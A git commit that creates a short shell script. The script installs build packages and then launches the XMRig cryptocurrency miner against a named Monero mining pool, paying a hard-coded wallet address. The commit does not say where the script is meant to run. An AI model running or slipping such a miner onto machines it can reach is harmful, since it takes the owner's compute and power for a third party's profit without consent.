9d09a2b7eec5dafd544d9491ad56bbe071ea2359
liyutg <liyutg@outlook.com>
2020-06-11 21:17:12 +0800

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,3 @@
+apt-get -y update
+apt-get -y install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev 
+x1/xmrig --donate-level 1 -o stratum+tcp://xmr.antpool.com:9005 -u 4AzWBLaH4e2MAut9nSMHi4D3ccpY2vqsSA4TBerGmcGM3Gmr89TUqq9QFBevDhzzCPZwSXCUXTXCDZHYVenZscdX9rj2otM -k -a rx/0
